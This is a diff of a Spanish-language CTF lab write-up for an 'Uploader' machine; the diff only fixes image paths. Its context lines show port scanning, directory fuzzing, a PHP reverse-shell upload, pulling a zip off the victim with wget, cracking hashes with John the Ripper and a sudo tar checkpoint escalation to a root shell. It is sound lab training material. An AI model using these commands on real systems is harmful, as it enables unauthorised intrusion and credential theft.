@@ -1,4 +1,4 @@
-![portada](/assets/portada.jpg)
+![portada](./assets/portada.jpg)
 
 # 📁 Uploader
 
@@ -19,7 +19,7 @@ nmap --stats-every=5s -p 0-65535 --open --min-rate=5000 -T5 -A -sT -Pn -n -v <IP
 
 - **Puerto 80 (HTTP):** Servidor web `Apache httpd 2.4.58` ejecutándose sobre un sistema operativo Ubuntu. La cabecera revela el título del sitio: `Uploader File Storage`.
 
-![1](/assets/Screenshot_2026-05-19_19-55-28.png)
+![1](./assets/Screenshot_2026-05-19_19-55-28.png)
 ## Fase 2: Enumeración Web. Buscando el almacén
 
 Al interactuar con la interfaz del puerto 80 nos topamos con que la página principal incluía un enlace directo hacia un apartado de subida de archivos (_upload_). El siguiente paso estratégico fue lanzar un ataque de fuzzing rápido mediante `ffuf` para indexar directorios ocultos o rutas de procesamiento del servidor:
@@ -29,7 +29,7 @@ Al interactuar con la interfaz del puerto 80 nos topamos con que la página prin
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt:FUZZ -u http://<IP_VICTIMA>/FUZZ -t 300 -mc 200,301
 ```
 
-![2](/assets/Screenshot_2026-05-19_19-57-02.png)
+![2](./assets/Screenshot_2026-05-19_19-57-02.png)
 
 **El secreto tras el muro:**
 
@@ -158,7 +158,7 @@ function printit ($string) {
 
 2. **Ejecución:** Cargué el script final a través del formulario de subida e invoqué el recurso directamente desde la ruta descubierta (`http://192.168.1.13/uploads/test.php`). Al interpretar el código, el servidor Apache nos devolvió una sesión interactiva, obteniendo acceso inicial bajo el contexto del usuario de servicio `www-data`.
 
-![3](/assets/Screenshot_2026-05-19_19-56-19 1.png)
+![3](./assets/Screenshot_2026-05-19_19-56-19 1.png)
 
 ## Fase 4: Movimiento Lateral. El secreto del operador
 
@@ -173,7 +173,7 @@ find / -name "*.zip" -type f 2>/dev/null
 
 **Resultado:** El rastreador localizó el contenedor en la ruta `/srv/secret/File.zip`.
 
-![4](/assets/Screenshot_2026-05-19_20-10-57.png
+![4](./assets/Screenshot_2026-05-19_20-10-57.png
 ### 🛰️ Exfiltración y Criptoanálisis del Contenedor
 
 Para trabajar con total comodidad y evitar la inestabilidad de la shell interactiva, monté un servicio web temporal con Python en la máquina víctima para descargar el botín de forma local en mi entorno de auditoría:
@@ -181,7 +181,7 @@ Para trabajar con total comodidad y evitar la inestabilidad de la shell interact
 - **Víctima:** `python3 -m http.server 8080`
 ![[Screenshot_2026-05-19_20-11-58.png]]
 - **Atacante:** `wget http://192.168.1.13:8080/File.zip`
-![5](/assets/Screenshot_2026-05-19_20-13-42.png)
+![5](./assets/Screenshot_2026-05-19_20-13-42.png)
 
 Al intentar interactuar con el contenedor descargado localmente, se detectó que requería autenticación. Procesé el archivo mediante `zip2john` para extraer su hash y ejecuté un ataque de fuerza bruta empleando John The Ripper:
 
@@ -191,7 +191,7 @@ zip2john File.zip > hash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
-![6](/assets/Screenshot_2026-05-19_20-17-56.png)
+![6](./assets/Screenshot_2026-05-19_20-17-56.png)
 
 Tras romper la protección del contenedor con la clave obtenida, empleé la herramienta `7z` para evadir los problemas de compatibilidad del formato nativo y extraer correctamente el directorio comprometido:
 
@@ -202,8 +202,8 @@ Tras romper la protección del contenedor con la clave obtenida, empleé la herr
 
 El documento de texto extraído (`Credentials.txt`) revelaba un nuevo nombre de usuario (`operatorx`) y una cadena de texto en formato hexadecimal asociada como contraseña.
 
-![7](/assets/Screenshot_2026-05-19_20-20-07.png)
-![8](/assets/Screenshot_2026-05-19_20-20-58.png)
+![7](./assets/Screenshot_2026-05-19_20-20-07.png)
+![8](./assets/Screenshot_2026-05-19_20-20-58.png)
 
 
 ### 🔓 Desencriptación de la Identidad de Usuario
@@ -215,7 +215,7 @@ Para identificar con precisión la naturaleza del hash antes de lanzar el ataque
 haiti d0970714757783e6cf17b26fb8e2298f
 ```
 
-![9](/assets/Screenshot_2026-05-19_20-24-11.png)
+![9](./assets/Screenshot_2026-05-19_20-24-11.png)
 
 Al confirmar mediante la herramienta que se trataba de un algoritmo clásico sin sal (`raw-md5`), almacené el hash en un archivo limpio y le ejecuté un ataque dirigido con John The Ripper para descifrarlo:
 
@@ -225,7 +225,7 @@ echo "d0970714757783e6cf17b26fb8e2298f" > operatorx.hash
 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt operatorx.hash
 ```
 
-![10](/assets/Screenshot_2026-05-19_20-26-06.png)
+![10](./assets/Screenshot_2026-05-19_20-26-06.png)
 
 La función matemática fue revertida con éxito. Con la contraseña real en texto plano, realicé el pivoteo horizontal hacia el nuevo usuario dentro de la máquina comprometida:
 
@@ -252,7 +252,7 @@ Consultando la documentación técnica en **GTFOBins**, se constató el abuso po
 sudo -u root /usr/bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-![11](/assets/Screenshot_2026-05-19_20-28-39.png)
+![11](./assets/Screenshot_2026-05-19_20-28-39.png)
 
 **Compromiso total:** El binario procesó la acción de forma inmediata, otorgando una terminal con el identificador máximo (`UID=0`). Acceso como **Root** consolidado.
 
@@ -265,6 +265,6 @@ Con el control absoluto de la infraestructura, restó ubicar los directorios pri
 cat /home/operatorx/user.txt /root/root.txt
 ```
 
-![12](/assets/Screenshot_2026-05-19_20-30-49.png)
+![12](./assets/Screenshot_2026-05-19_20-30-49.png)
 
 Una máquina fantástica para consolidar destrezas en auditoría web, análisis de contenedores cifrados y el peligro crítico que representan los binarios mal configurados en las directivas de elevación del sistema. ¡A por la siguiente!
